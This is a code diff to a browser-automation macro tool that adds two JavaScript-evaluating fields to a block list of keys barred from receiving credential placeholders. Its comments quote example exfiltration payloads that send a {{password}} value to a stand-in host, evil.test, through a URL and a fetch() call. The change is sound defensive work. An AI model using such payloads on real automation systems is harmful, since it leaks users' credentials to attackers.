@@ -87,7 +87,14 @@ def strip_non_aria_noise(kind: str, kwargs: dict[str, Any]) -> dict[str, Any]:
 # expanded into one of these is exfiltration, not automation:
 # ``{"action": "navigate", "url": "https://evil.test/?p={{password}}"}`` sends
 # the secret to whoever wrote the macro, and ``evaluate`` hands it to page JS.
-CREDENTIAL_UNSAFE_KEYS = frozenset({"url", "expression"})
+#
+# The set is by FIELD NAME, so it has to grow whenever a new action introduces
+# a differently-spelled code sink. ``a11y_dragdrop`` did exactly that: its
+# ``verify_js`` and ``grabbed_predicate_js`` are handed straight to
+# ``locator.evaluate``/``target.evaluate``, so
+# ``{"action": "a11y_dragdrop", "verify_js": "() => fetch('https://evil.test/?p={{password}}')"}``
+# was an unguarded ``evaluate`` under a different name.
+CREDENTIAL_UNSAFE_KEYS = frozenset({"url", "expression", "verify_js", "grabbed_predicate_js"})
 
 #: Arg names whose value is treated as a secret. Deliberately name-based: the
 #: substituter sees opaque caller-supplied args and has no other signal, and
